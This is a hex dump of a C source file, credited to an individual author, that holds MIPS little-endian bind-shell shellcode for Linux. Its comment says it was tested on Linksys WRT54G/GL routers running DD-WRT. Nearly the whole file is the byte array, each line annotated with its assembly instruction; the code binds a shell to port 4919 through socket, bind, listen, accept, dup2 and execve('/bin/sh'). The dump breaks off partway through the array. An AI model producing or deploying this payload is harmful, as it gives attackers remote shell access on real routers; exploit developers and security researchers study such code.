00000000  2f 2a 09 2d 20 4d 49 50  53 20 6c 69 74 74 6c 65  |/*.- MIPS little|
00000010  2d 65 6e 64 69 61 6e 20  0d 0a 20 2a 09 2d 20 6c  |-endian .. *.- l|
00000020  69 6e 75 78 20 70 6f 72  74 20 6c 69 73 74 65 6e  |inux port listen|
00000030  65 72 20 32 37 36 20 62  79 74 65 73 20 73 68 65  |er 276 bytes she|
00000040  6c 6c 63 6f 64 65 20 0d  0a 20 2a 09 2d 20 65 78  |llcode .. *.- ex|
00000050  65 63 76 65 28 22 2f 62  69 6e 2f 73 68 22 2c 5b  |ecve("/bin/sh",[|
00000060  22 2f 62 69 6e 2f 73 68  22 5d 2c 5b 5d 29 3b 0d  |"/bin/sh"],[]);.|
00000070  0a 20 2a 09 2d 20 70 6f  72 74 20 30 78 31 33 33  |. *.- port 0x133|
00000080  37 20 28 34 39 31 39 29  0d 0a 20 2a 09 2d 20 74  |7 (4919).. *.- t|
00000090  65 73 74 65 64 20 6f 6e  20 4c 69 6e 6b 73 79 73  |ested on Linksys|
000000a0  20 57 52 54 35 34 47 2f  47 4c 20 28 44 44 2d 57  | WRT54G/GL (DD-W|
000000b0  52 54 20 4c 69 6e 75 78  29 0d 0a 20 2a 20 20 20  |RT Linux).. *   |
000000c0  20 20 20 2d 20 62 61 73  65 64 20 6f 6e 20 73 63  |   - based on sc|
000000d0  75 74 20 70 61 70 65 72  20 57 72 69 74 69 6e 67  |ut paper Writing|
000000e0  20 4d 49 50 53 2f 49 72  69 78 20 73 68 65 6c 6c  | MIPS/Irix shell|
000000f0  63 6f 64 65 0d 0a 20 2a  0d 0a 20 2a 20 09 09 09  |code.. *.. * ...|
00000100  09 76 61 69 63 65 62 69  6e 65 20 61 74 20 67 6d  |.vaicebine at gm|
00000110  61 69 6c 20 64 6f 74 20  63 6f 6d 0d 0a 20 2a 2f  |ail dot com.. */|
00000120  0d 0a 23 69 6e 63 6c 75  64 65 20 22 73 74 64 69  |..#include "stdi|
00000130  6f 2e 68 22 0d 0a 0d 0a  63 68 61 72 20 70 6f 72  |o.h"....char por|
00000140  74 5f 62 69 6e 64 5f 73  68 65 6c 6c 63 6f 64 65  |t_bind_shellcode|
00000150  5b 5d 20 3d 20 0d 0a 09  22 5c 78 65 30 5c 78 66  |[] = ..."\xe0\xf|
00000160  66 5c 78 62 64 5c 78 32  37 22 09 2f 2a 20 20 20  |f\xbd\x27"./*   |
00000170  20 20 61 64 64 69 75 20  20 20 73 70 2c 73 70 2c  |  addiu   sp,sp,|
00000180  2d 33 32 20 20 20 20 20  20 20 20 20 20 20 20 20  |-32             |
00000190  20 20 20 2a 2f 0d 0a 09  22 5c 78 66 64 5c 78 66  |   */..."\xfd\xf|
000001a0  66 5c 78 30 65 5c 78 32  34 22 09 2f 2a 20 20 20  |f\x0e\x24"./*   |
000001b0  20 20 6c 69 20 20 20 20  20 20 74 36 2c 2d 33 20  |  li      t6,-3 |
000001c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001d0  20 20 20 2a 2f 0d 0a 09  22 5c 78 32 37 5c 78 32  |   */..."\x27\x2|
000001e0  30 5c 78 63 30 5c 78 30  31 22 09 2f 2a 20 20 20  |0\xc0\x01"./*   |
000001f0  20 20 6e 6f 72 20 20 20  20 20 61 30 2c 74 36 2c  |  nor     a0,t6,|
00000200  7a 65 72 6f 20 20 20 20  20 20 20 20 20 20 20 20  |zero            |
00000210  20 20 20 2a 2f 0d 0a 09  22 5c 78 32 37 5c 78 32  |   */..."\x27\x2|
00000220  38 5c 78 63 30 5c 78 30  31 22 09 2f 2a 20 20 20  |8\xc0\x01"./*   |
00000230  20 20 6e 6f 72 20 20 20  20 20 61 31 2c 74 36 2c  |  nor     a1,t6,|
00000240  7a 65 72 6f 20 20 20 20  20 20 20 20 20 20 20 20  |zero            |
00000250  20 20 20 2a 2f 0d 0a 09  22 5c 78 66 66 5c 78 66  |   */..."\xff\xf|
00000260  66 5c 78 30 36 5c 78 32  38 22 09 2f 2a 20 20 20  |f\x06\x28"./*   |
00000270  20 20 73 6c 74 69 20 20  20 20 61 32 2c 7a 65 72  |  slti    a2,zer|
00000280  6f 2c 2d 31 20 20 20 20  20 20 20 20 20 20 20 20  |o,-1            |
00000290  20 20 20 2a 2f 09 0d 0a  09 22 5c 78 35 37 5c 78  |   */...."\x57\x|
000002a0  31 30 5c 78 30 32 5c 78  32 34 22 09 2f 2a 20 20  |10\x02\x24"./*  |
000002b0  20 20 20 6c 69 20 20 20  20 20 20 76 30 2c 34 31  |   li      v0,41|
000002c0  38 33 20 28 20 5f 5f 4e  52 5f 73 6f 63 6b 65 74  |83 ( __NR_socket|
000002d0  20 29 20 20 2a 2f 0d 0a  09 22 5c 78 30 63 5c 78  | )  */..."\x0c\x|
000002e0  30 31 5c 78 30 31 5c 78  30 31 22 09 2f 2a 20 20  |01\x01\x01"./*  |
000002f0  20 20 20 73 79 73 63 61  6c 6c 20 20 20 20 20 20  |   syscall      |
00000300  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000310  20 20 20 20 2a 2f 0d 0a  09 22 5c 78 35 30 5c 78  |    */..."\x50\x|
00000320  37 33 5c 78 30 66 5c 78  32 34 22 09 2f 2a 20 20  |73\x0f\x24"./*  |
00000330  20 20 20 6c 69 20 20 20  20 20 20 74 37 2c 30 78  |   li      t7,0x|
00000340  37 33 35 30 20 28 6e 6f  70 29 20 20 20 20 20 20  |7350 (nop)      |
00000350  20 20 20 20 2a 2f 0d 0a  09 22 5c 78 66 66 5c 78  |    */..."\xff\x|
00000360  66 66 5c 78 35 30 5c 78  33 30 22 09 2f 2a 20 20  |ff\x50\x30"./*  |
00000370  20 20 20 61 6e 64 69 20  20 20 20 73 30 2c 76 30  |   andi    s0,v0|
00000380  2c 30 78 66 66 66 66 20  20 20 20 20 20 20 20 20  |,0xffff         |
00000390  20 20 20 20 2a 2f 09 0d  0a 09 22 5c 78 65 66 5c  |    */...."\xef\|
000003a0  78 66 66 5c 78 30 65 5c  78 32 34 22 09 2f 2a 20  |xff\x0e\x24"./* |
000003b0  20 20 20 20 6c 69 20 20  20 20 20 20 74 36 2c 2d  |    li      t6,-|
000003c0  31 37 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |17              |
000003d0  20 20 20 20 20 2a 2f 0d  0a 09 22 5c 78 32 37 5c  |     */..."\x27\|
000003e0  78 37 30 5c 78 63 30 5c  78 30 31 22 09 2f 2a 20  |x70\xc0\x01"./* |
000003f0  20 20 20 20 6e 6f 72 20  20 20 20 20 74 36 2c 74  |    nor     t6,t|
00000400  36 2c 7a 65 72 6f 20 20  20 20 20 20 20 20 20 20  |6,zero          |
00000410  20 20 20 20 20 2a 2f 0d  0a 09 22 5c 78 31 33 5c  |     */..."\x13\|
00000420  78 33 37 5c 78 30 64 5c  78 32 34 22 09 2f 2a 20  |x37\x0d\x24"./* |
00000430  20 20 20 20 6c 69 20 20  20 20 20 20 74 35 2c 30  |    li      t5,0|
00000440  78 33 37 31 33 20 28 70  6f 72 74 20 30 78 31 33  |x3713 (port 0x13|
00000450  33 37 29 20 20 2a 2f 0d  0a 09 22 5c 78 30 34 5c  |37)  */..."\x04\|
00000460  78 36 38 5c 78 63 64 5c  78 30 31 22 09 2f 2a 20  |x68\xcd\x01"./* |
00000470  20 20 20 20 73 6c 6c 76  20 20 20 20 74 35 2c 74  |    sllv    t5,t|
00000480  35 2c 74 36 20 20 20 20  20 20 20 20 20 20 20 20  |5,t6            |
00000490  20 20 20 20 20 2a 2f 0d  0a 09 22 5c 78 66 66 5c  |     */..."\xff\|
000004a0  78 66 64 5c 78 30 65 5c  78 32 34 22 09 2f 2a 20  |xfd\x0e\x24"./* |
000004b0  20 20 20 20 6c 69 20 20  20 20 20 20 74 36 2c 2d  |    li      t6,-|
000004c0  35 31 33 20 20 20 20 20  20 20 20 20 20 20 20 20  |513             |
000004d0  20 20 20 20 20 2a 2f 0d  0a 09 22 5c 78 32 37 5c  |     */..."\x27\|
000004e0  78 37 30 5c 78 63 30 5c  78 30 31 22 09 2f 2a 20  |x70\xc0\x01"./* |
000004f0  20 20 20 20 6e 6f 72 20  20 20 20 20 74 36 2c 74  |    nor     t6,t|
00000500  36 2c 7a 65 72 6f 20 20  20 20 20 20 20 20 20 20  |6,zero          |
00000510  20 20 20 20 20 2a 2f 0d  0a 09 22 5c 78 32 35 5c  |     */..."\x25\|
00000520  78 36 38 5c 78 61 65 5c  78 30 31 22 09 2f 2a 20  |x68\xae\x01"./* |
00000530  20 20 20 20 6f 72 20 20  20 20 20 20 74 35 2c 74  |    or      t5,t|
00000540  35 2c 74 36 20 20 20 20  20 20 20 20 20 20 20 20  |5,t6            |
00000550  20 20 20 20 20 2a 2f 0d  0a 09 22 5c 78 65 30 5c  |     */..."\xe0\|
00000560  78 66 66 5c 78 61 64 5c  78 61 66 22 09 2f 2a 20  |xff\xad\xaf"./* |
00000570  20 20 20 20 73 77 20 20  20 20 20 20 74 35 2c 2d  |    sw      t5,-|
00000580  33 32 28 73 70 29 20 20  20 20 20 20 20 20 20 20  |32(sp)          |
00000590  20 20 20 20 20 2a 2f 0d  0a 09 22 5c 78 65 34 5c  |     */..."\xe4\|
000005a0  78 66 66 5c 78 61 30 5c  78 61 66 22 09 2f 2a 20  |xff\xa0\xaf"./* |
000005b0  20 20 20 20 73 77 20 20  20 20 20 20 7a 65 72 6f  |    sw      zero|
000005c0  2c 2d 32 38 28 73 70 29  20 20 20 20 20 20 20 20  |,-28(sp)        |
000005d0  20 20 20 20 20 2a 2f 09  0d 0a 09 22 5c 78 65 38  |     */...."\xe8|
000005e0  5c 78 66 66 5c 78 61 30  5c 78 61 66 22 09 2f 2a  |\xff\xa0\xaf"./*|
000005f0  20 20 20 20 20 73 77 20  20 20 20 20 20 7a 65 72  |     sw      zer|
00000600  6f 2c 2d 32 34 28 73 70  29 20 20 20 20 20 20 20  |o,-24(sp)       |
00000610  20 20 20 20 20 20 2a 2f  0d 0a 09 22 5c 78 65 63  |      */..."\xec|
00000620  5c 78 66 66 5c 78 61 30  5c 78 61 66 22 09 2f 2a  |\xff\xa0\xaf"./*|
00000630  20 20 20 20 20 73 77 20  20 20 20 20 20 7a 65 72  |     sw      zer|
00000640  6f 2c 2d 32 30 28 73 70  29 20 20 20 20 20 20 20  |o,-20(sp)       |
00000650  20 20 20 20 20 20 2a 2f  0d 0a 09 22 5c 78 32 35  |      */..."\x25|
00000660  5c 78 32 30 5c 78 31 30  5c 78 30 32 22 09 2f 2a  |\x20\x10\x02"./*|
00000670  20 20 20 20 20 6f 72 20  20 20 20 20 20 61 30 2c  |     or      a0,|
00000680  73 30 2c 73 30 20 20 20  20 20 20 20 20 20 20 20  |s0,s0           |
00000690  20 20 20 20 20 20 2a 2f  0d 0a 09 22 5c 78 65 66  |      */..."\xef|
000006a0  5c 78 66 66 5c 78 30 65  5c 78 32 34 22 09 2f 2a  |\xff\x0e\x24"./*|
000006b0  20 20 20 20 20 6c 69 20  20 20 20 20 20 74 36 2c  |     li      t6,|
000006c0  2d 31 37 20 20 20 20 20  20 20 20 20 20 20 20 20  |-17             |
000006d0  20 20 20 20 20 20 2a 2f  0d 0a 09 22 5c 78 32 37  |      */..."\x27|
000006e0  5c 78 33 30 5c 78 63 30  5c 78 30 31 22 09 2f 2a  |\x30\xc0\x01"./*|
000006f0  20 20 20 20 20 6e 6f 72  20 20 20 20 20 61 32 2c  |     nor     a2,|
00000700  74 36 2c 7a 65 72 6f 20  20 20 20 20 20 20 20 20  |t6,zero         |
00000710  20 20 20 20 20 20 2a 2f  0d 0a 09 22 5c 78 65 30  |      */..."\xe0|
00000720  5c 78 66 66 5c 78 61 35  5c 78 32 33 22 09 2f 2a  |\xff\xa5\x23"./*|
00000730  20 20 20 20 20 61 64 64  69 20 20 20 20 61 31 2c  |     addi    a1,|
00000740  73 70 2c 2d 33 32 20 20  20 20 20 20 20 20 20 20  |sp,-32          |
00000750  20 20 20 20 20 20 2a 2f  0d 0a 09 22 5c 78 34 39  |      */..."\x49|
00000760  5c 78 31 30 5c 78 30 32  5c 78 32 34 22 09 2f 2a  |\x10\x02\x24"./*|
00000770  20 20 20 20 20 6c 69 20  20 20 20 20 20 76 30 2c  |     li      v0,|
00000780  34 31 36 39 20 28 20 5f  5f 4e 52 5f 62 69 6e 64  |4169 ( __NR_bind|
00000790  20 29 20 20 20 20 2a 2f  0d 0a 09 22 5c 78 30 63  | )    */..."\x0c|
000007a0  5c 78 30 31 5c 78 30 31  5c 78 30 31 22 09 2f 2a  |\x01\x01\x01"./*|
000007b0  20 20 20 20 20 73 79 73  63 61 6c 6c 20 20 20 20  |     syscall    |
000007c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000007d0  20 20 20 20 20 20 2a 2f  0d 0a 09 22 5c 78 35 30  |      */..."\x50|
000007e0  5c 78 37 33 5c 78 30 66  5c 78 32 34 22 09 2f 2a  |\x73\x0f\x24"./*|
000007f0  20 20 20 20 20 6c 69 20  20 20 20 20 20 74 37 2c  |     li      t7,|
00000800  30 78 37 33 35 30 20 28  6e 6f 70 29 20 20 20 20  |0x7350 (nop)    |
00000810  20 20 20 20 20 20 2a 2f  0d 0a 09 22 5c 78 32 35  |      */..."\x25|
00000820  5c 78 32 30 5c 78 31 30  5c 78 30 32 22 09 2f 2a  |\x20\x10\x02"./*|
00000830  20 20 20 20 20 6f 72 20  20 20 20 20 20 61 30 2c  |     or      a0,|
00000840  73 30 2c 73 30 20 20 20  20 20 20 20 20 20 20 20  |s0,s0           |
00000850  20 20 20 20 20 20 2a 2f  0d 0a 09 22 5c 78 30 31  |      */..."\x01|
00000860  5c 78 30 31 5c 78 30 35  5c 78 32 34 22 09 2f 2a  |\x01\x05\x24"./*|
00000870  20 20 20 20 20 6c 69 20  20 20 20 20 20 61 31 2c  |     li      a1,|
00000880  32 35 37 20 20 20 20 20  20 20 20 20 20 20 20 20  |257             |
00000890  20 20 20 20 20 20 2a 2f  0d 0a 09 22 5c 78 34 65  |      */..."\x4e|
000008a0  5c 78 31 30 5c 78 30 32  5c 78 32 34 22 09 2f 2a  |\x10\x02\x24"./*|
000008b0  20 20 20 20 20 6c 69 20  20 20 20 20 20 76 30 2c  |     li      v0,|
000008c0  34 31 37 34 20 28 20 5f  5f 4e 52 5f 6c 69 73 74  |4174 ( __NR_list|
000008d0  65 6e 20 29 20 20 2a 2f  09 0d 0a 09 22 5c 78 30  |en )  */...."\x0|
000008e0  63 5c 78 30 31 5c 78 30  31 5c 78 30 31 22 09 2f  |c\x01\x01\x01"./|
000008f0  2a 20 20 20 20 20 73 79  73 63 61 6c 6c 20 20 20  |*     syscall   |
00000900  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000910  20 20 20 20 20 20 20 2a  2f 0d 0a 09 22 5c 78 35  |       */..."\x5|
00000920  30 5c 78 37 33 5c 78 30  66 5c 78 32 34 22 09 2f  |0\x73\x0f\x24"./|
00000930  2a 20 20 20 20 20 6c 69  20 20 20 20 20 20 74 37  |*     li      t7|
00000940  2c 30 78 37 33 35 30 20  28 6e 6f 70 29 20 20 20  |,0x7350 (nop)   |
00000950  20 20 20 20 20 20 20 2a  2f 0d 0a 09 22 5c 78 32  |       */..."\x2|
00000960  35 5c 78 32 30 5c 78 31  30 5c 78 30 32 22 09 2f  |5\x20\x10\x02"./|
00000970  2a 20 20 20 20 20 6f 72  20 20 20 20 20 20 61 30  |*     or      a0|
00000980  2c 73 30 2c 73 30 20 20  20 20 20 20 20 20 20 20  |,s0,s0          |
00000990  20 20 20 20 20 20 20 2a  2f 0d 0a 09 22 5c 78 66  |       */..."\xf|
000009a0  66 5c 78 66 66 5c 78 30  35 5c 78 32 38 22 09 2f  |f\xff\x05\x28"./|
000009b0  2a 20 20 20 20 20 73 6c  74 69 20 20 20 20 61 31  |*     slti    a1|
000009c0  2c 7a 65 72 6f 2c 2d 31  20 20 20 20 20 20 20 20  |,zero,-1        |
000009d0  20 20 20 20 20 20 20 2a  2f 0d 0a 09 22 5c 78 66  |       */..."\xf|
000009e0  66 5c 78 66 66 5c 78 30  36 5c 78 32 38 22 09 2f  |f\xff\x06\x28"./|
000009f0  2a 20 20 20 20 20 73 6c  74 69 20 20 20 20 61 32  |*     slti    a2|
00000a00  2c 7a 65 72 6f 2c 2d 31  20 20 20 20 20 20 20 20  |,zero,-1        |
00000a10  20 20 20 20 20 20 20 2a  2f 0d 0a 09 22 5c 78 34  |       */..."\x4|
00000a20  38 5c 78 31 30 5c 78 30  32 5c 78 32 34 22 09 2f  |8\x10\x02\x24"./|
00000a30  2a 20 20 20 20 20 6c 69  20 20 20 20 20 20 76 30  |*     li      v0|
00000a40  2c 34 31 36 38 20 28 20  5f 5f 4e 52 5f 61 63 63  |,4168 ( __NR_acc|
00000a50  65 70 74 20 29 20 20 2a  2f 0d 0a 09 22 5c 78 30  |ept )  */..."\x0|
00000a60  63 5c 78 30 31 5c 78 30  31 5c 78 30 31 22 09 2f  |c\x01\x01\x01"./|
00000a70  2a 20 20 20 20 20 73 79  73 63 61 6c 6c 20 20 20  |*     syscall   |
00000a80  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a90  20 20 20 20 20 20 20 2a  2f 0d 0a 09 22 5c 78 35  |       */..."\x5|
00000aa0  30 5c 78 37 33 5c 78 30  66 5c 78 32 34 22 09 2f  |0\x73\x0f\x24"./|
00000ab0  2a 20 20 20 20 20 6c 69  20 20 20 20 20 20 74 37  |*     li      t7|
00000ac0  2c 30 78 37 33 35 30 20  28 6e 6f 70 29 20 20 20  |,0x7350 (nop)   |
00000ad0  20 20 20 20 20 20 20 2a  2f 0d 0a 09 22 5c 78 66  |       */..."\xf|
00000ae0  66 5c 78 66 66 5c 78 35  30 5c 78 33 30 22 09 2f  |f\xff\x50\x30"./|
00000af0  2a 20 20 20 20 20 61 6e  64 69 20 20 20 20 73 30  |*     andi    s0|
00000b00  2c 76 30 2c 30 78 66 66  66 66 20 20 20 20 20 20  |,v0,0xffff      |
00000b10  20 20 20 20 20 20 20 2a  2f 09 0d 0a 09 22 5c 78  |       */...."\x|
00000b20  32 35 5c 78 32 30 5c 78  31 30 5c 78 30 32 22 09  |25\x20\x10\x02".|
00000b30  2f 2a 20 20 20 20 20 6f  72 20 20 20 20 20 20 61  |/*     or      a|
00000b40  30 2c 73 30 2c 73 30 20  20 20 20 20 20 20 20 20  |0,s0,s0         |
00000b50  20 20 20 20 20 20 20 20  2a 2f 0d 0a 09 22 5c 78  |        */..."\x|
00000b60  66 64 5c 78 66 66 5c 78  30 66 5c 78 32 34 22 09  |fd\xff\x0f\x24".|
00000b70  2f 2a 20 20 20 20 20 6c  69 20 20 20 20 20 20 74  |/*     li      t|
00000b80  37 2c 2d 33 20 20 20 20  20 20 20 20 20 20 20 20  |7,-3            |
00000b90  20 20 20 20 20 20 20 20  2a 2f 0d 0a 09 22 5c 78  |        */..."\x|
00000ba0  32 37 5c 78 32 38 5c 78  65 30 5c 78 30 31 22 09  |27\x28\xe0\x01".|
00000bb0  2f 2a 20 20 20 20 20 6e  6f 72 20 20 20 20 20 61  |/*     nor     a|
00000bc0  31 2c 74 37 2c 7a 65 72  6f 20 20 20 20 20 20 20  |1,t7,zero       |
00000bd0  20 20 20 20 20 20 20 20  2a 2f 0d 0a 09 22 5c 78  |        */..."\x|
00000be0  64 66 5c 78 30 66 5c 78  30 32 5c 78 32 34 22 09  |df\x0f\x02\x24".|
00000bf0  2f 2a 20 20 20 20 20 6c  69 20 20 20 20 20 20 76  |/*     li      v|
00000c00  30 2c 34 30 36 33 20 28  20 5f 5f 4e 52 5f 64 75  |0,4063 ( __NR_du|
00000c10  70 32 20 29 20 20 20 20  2a 2f 0d 0a 09 22 5c 78  |p2 )    */..."\x|
00000c20  30 63 5c 78 30 31 5c 78  30 31 5c 78 30 31 22 09  |0c\x01\x01\x01".|
00000c30  2f 2a 20 20 20 20 20 73  79 73 63 61 6c 6c 20 20  |/*     syscall  |
00000c40  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000c50  20 20 20 20 20 20 20 20  2a 2f 0d 0a 09 22 5c 78  |        */..."\x|
00000c60  35 30 5c 78 37 33 5c 78  30 66 5c 78 32 34 22 09  |50\x73\x0f\x24".|
00000c70  2f 2a 20 20 20 20 20 6c  69 20 20 20 20 20 20 74  |/*     li      t|
00000c80  37 2c 30 78 37 33 35 30  20 28 6e 6f 70 29 20 20  |7,0x7350 (nop)  |
00000c90  20 20 20 20 20 20 20 20  2a 2f 0d 0a 09 22 5c 78  |        */..."\x|
00000ca0  32 35 5c 78 32 30 5c 78  31 30 5c 78 30 32 22 09  |25\x20\x10\x02".|
00000cb0  2f 2a 20 20 20 20 20 6f  72 20 20 20 20 20 20 61  |/*     or      a|
00000cc0  30 2c 73 30 2c 73 30 20  20 20 20 20 20 20 20 20  |0,s0,s0         |
00000cd0  20 20 20 20 20 20 20 20  2a 2f 0d 0a 09 22 5c 78  |        */..."\x|
00000ce0  30 31 5c 78 30 31 5c 78  30 35 5c 78 32 38 22 09  |01\x01\x05\x28".|
00000cf0  2f 2a 20 20 20 20 20 73  6c 74 69 20 20 20 20 61  |/*     slti    a|
00000d00  31 2c 7a 65 72 6f 2c 30  78 30 31 30 31 20 20 20  |1,zero,0x0101   |
00000d10  20 20 20 20 20 20 20 20  2a 2f 0d 0a 09 22 5c 78  |        */..."\x|
00000d20  64 66 5c 78 30 66 5c 78  30 32 5c 78 32 34 22 09  |df\x0f\x02\x24".|
00000d30  2f 2a 20 20 20 20 20 6c  69 20 20 20 20 20 20 76  |/*     li      v|
00000d40  30 2c 34 30 36 33 20 28  20 5f 5f 4e 52 5f 64 75  |0,4063 ( __NR_du|
00000d50  70 32 20 29 20 20 20 20  2a 2f 0d 0a 09 22 5c 78  |p2 )    */..."\x|
00000d60  30 63 5c 78 30 31 5c 78  30 31 5c 78 30 31 22 09  |0c\x01\x01\x01".|
00000d70  2f 2a 20 20 20 20 20 73  79 73 63 61 6c 6c 20 20  |/*     syscall  |
00000d80  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000d90  20 20 20 20 20 20 20 20  2a 2f 0d 0a 09 22 5c 78  |        */..."\x|
00000da0  35 30 5c 78 37 33 5c 78  30 66 5c 78 32 34 22 09  |50\x73\x0f\x24".|
00000db0  2f 2a 20 20 20 20 20 6c  69 20 20 20 20 20 20 74  |/*     li      t|
00000dc0  37 2c 30 78 37 33 35 30  20 28 6e 6f 70 29 20 20  |7,0x7350 (nop)  |
00000dd0  20 20 20 20 20 20 20 20  2a 2f 0d 0a 09 22 5c 78  |        */..."\x|
00000de0  32 35 5c 78 32 30 5c 78  31 30 5c 78 30 32 22 09  |25\x20\x10\x02".|
00000df0  2f 2a 20 20 20 20 20 6f  72 20 20 20 20 20 20 61  |/*     or      a|
00000e00  30 2c 73 30 2c 73 30 20  20 20 20 20 20 20 20 20  |0,s0,s0         |
00000e10  20 20 20 20 20 20 20 20  2a 2f 0d 0a 09 22 5c 78  |        */..."\x|
00000e20  66 66 5c 78 66 66 5c 78  30 35 5c 78 32 38 22 09  |ff\xff\x05\x28".|
00000e30  2f 2a 20 20 20 20 20 73  6c 74 69 20 20 20 20 61  |/*     slti    a|
00000e40  31 2c 7a 65 72 6f 2c 2d  31 20 20 20 20 20 20 20  |1,zero,-1       |
00000e50  20 20 20 20 20 20 20 20  2a 2f 09 0d 0a 09 22 5c  |        */...."\|
00000e60  78 64 66 5c 78 30 66 5c  78 30 32 5c 78 32 34 22  |xdf\x0f\x02\x24"|
00000e70  09 2f 2a 20 20 20 20 20  6c 69 20 20 20 20 20 20  |./*     li      |
00000e80  76 30 2c 34 30 36 33 20  28 20 5f 5f 4e 52 5f 64  |v0,4063 ( __NR_d|
00000e90  75 70 32 20 29 20 20 20  20 2a 2f 0d 0a 09 22 5c  |up2 )    */..."\|
00000ea0  78 30 63 5c 78 30 31 5c  78 30 31 5c 78 30 31 22  |x0c\x01\x01\x01"|
00000eb0  09 2f 2a 20 20 20 20 20  73 79 73 63 61 6c 6c 20  |./*     syscall |
00000ec0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000ed0  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 09 22 5c  |         */..."\|
00000ee0  78 35 30 5c 78 37 33 5c  78 30 66 5c 78 32 34 22  |x50\x73\x0f\x24"|
00000ef0  09 2f 2a 20 20 20 20 20  6c 69 20 20 20 20 20 20  |./*     li      |
00000f00  74 37 2c 30 78 37 33 35  30 20 28 6e 6f 70 29 20  |t7,0x7350 (nop) |
00000f10  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 09 22 5c  |         */..."\|
00000f20  78 35 30 5c 78 37 33 5c  78 30 36 5c 78 32 34 22  |x50\x73\x06\x24"|
00000f30  09 2f 2a 20 20 20 20 20  6c 69 20 20 20 20 20 20  |./*     li      |
00000f40  61 32 2c 30 78 37 33 35  30 20 20 20 20 20 20 20  |a2,0x7350       |
00000f50  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 09 22 5c  |         */..."\|
00000f60  78 66 66 5c 78 66 66 5c  78 64 30 5c 78 30 34 22  |xff\xff\xd0\x04"|
00000f70  09 2f 2a 20 4c 42 3a 20  62 6c 74 7a 61 6c 20 20  |./* LB: bltzal  |
00000f80  61 32 2c 4c 42 20 20 20  20 20 20 20 20 20 20 20  |a2,LB           |
00000f90  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 09 22 5c  |         */..."\|
00000fa0  78 35 30 5c 78 37 33 5c  78 30 66 5c 78 32 34 22  |x50\x73\x0f\x24"|
00000fb0  09 2f 2a 20 20 20 20 20  6c 69 20 20 20 20 20 20  |./*     li      |
00000fc0  74 37 2c 30 78 37 33 35  30 20 28 6e 6f 70 29 20  |t7,0x7350 (nop) |
00000fd0  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 09 22 5c  |         */..."\|
00000fe0  78 66 66 5c 78 66 66 5c  78 30 36 5c 78 32 38 22  |xff\xff\x06\x28"|
00000ff0  09 2f 2a 20 20 20 20 20  73 6c 74 69 20 20 20 20  |./*     slti    |
00001000  61 32 2c 7a 65 72 6f 2c  2d 31 20 20 20 20 20 20  |a2,zero,-1      |
00001010  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 09 22 5c  |         */..."\|
00001020  78 64 62 5c 78 66 66 5c  78 30 66 5c 78 32 34 22  |xdb\xff\x0f\x24"|
00001030  09 2f 2a 20 20 20 20 20  6c 69 20 20 20 20 20 20  |./*     li      |
00001040  74 37 2c 2d 33 37 20 20  20 20 20 20 20 20 20 20  |t7,-37          |
00001050  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 09 22 5c  |         */..."\|
00001060  78 32 37 5c 78 37 38 5c  78 65 30 5c 78 30 31 22  |x27\x78\xe0\x01"|
00001070  09 2f 2a 20 20 20 20 20  6e 6f 72 20 20 20 20 20  |./*     nor     |
00001080  74 37 2c 74 37 2c 7a 65  72 6f 20 20 20 20 20 20  |t7,t7,zero      |
00001090  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 09 22 5c  |         */..."\|
000010a0  78 32 31 5c 78 32 30 5c  78 65 66 5c 78 30 33 22  |x21\x20\xef\x03"|
000010b0  09 2f 2a 20 20 20 20 20  61 64 64 75 20 20 20 20  |./*     addu    |
000010c0  61 30 2c 72 61 2c 74 37  20 20 20 20 20 20 20 20  |a0,ra,t7        |
000010d0  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 09 22 5c  |         */..."\|
000010e0  78 66 30 5c 78 66 66 5c  78 61 34 5c 78 61 66 22  |xf0\xff\xa4\xaf"|
000010f0  09 2f 2a 20 20 20 20 20  73 77 20 20 20 20 20 20  |./*     sw      |
00001100  61 30 2c 2d 31 36 28 73  70 29 20 20 20 20 20 20  |a0,-16(sp)      |
00001110  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 09 22 5c  |         */..."\|
00001120  78 66 34 5c 78 66 66 5c  78 61 30 5c 78 61 66 22  |xf4\xff\xa0\xaf"|
00001130  09 2f 2a 20 20 20 20 20  73 77 20 20 20 20 20 20  |./*     sw      |
00001140  7a 65 72 6f 2c 2d 31 32  28 73 70 29 20 20 20 20  |zero,-12(sp)    |
00001150  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 09 22 5c  |         */..."\|
00001160  78 66 30 5c 78 66 66 5c  78 61 35 5c 78 32 33 22  |xf0\xff\xa5\x23"|
00001170  09 2f 2a 20 20 20 20 20  61 64 64 69 20 20 20 20  |./*     addi    |
00001180  61 31 2c 73 70 2c 2d 31  36 20 20 20 20 20 20 20  |a1,sp,-16       |
00001190  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 09 22 5c  |         */..."\|
000011a0  78 61 62 5c 78 30 66 5c  78 30 32 5c 78 32 34 22  |xab\x0f\x02\x24"|
000011b0  09 2f 2a 20 20 20 20 20  6c 69 20 20 20 20 20 20  |./*     li      |
000011c0  76 30 2c 34 30 31 31 20  28 20 5f 5f 4e 52 5f 65  |v0,4011 ( __NR_e|
000011d0  78 65 63 76 65 20 29 20  20 2a 2f 0d 0a 09 22 5c  |xecve )  */..."\|
000011e0  78 30 63 5c 78 30 31 5c  78 30 31 5c 78 30 31 22  |x0c\x01\x01\x01"|
000011f0  09 2f 2a 20 20 20 20 20  73 79 73 63 61 6c 6c 20  |./*     syscall |
00001200  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001210  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 09 22 2f  |         */..."/|
